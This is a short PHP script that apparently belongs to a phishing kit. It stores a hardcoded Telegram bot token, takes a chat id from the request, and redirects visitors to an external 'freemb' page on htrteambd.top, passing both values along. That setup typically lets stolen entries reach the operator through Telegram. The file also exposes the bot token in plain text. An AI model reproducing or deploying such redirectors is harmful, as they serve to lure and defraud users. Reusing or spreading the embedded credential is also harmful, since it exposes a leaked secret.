<?php
// @REDX_64
$botToken = "8752004924:AAGzno5U9YIw9V1bm7M5F9C1SqaipCVDCT4";
 $chatId = $_REQUEST["chatId"];

$link = "https://htrteambd.top/tnl/freemb.php?botToken=$botToken&id=$chatId";

header("Location: $link");
exit();
?>
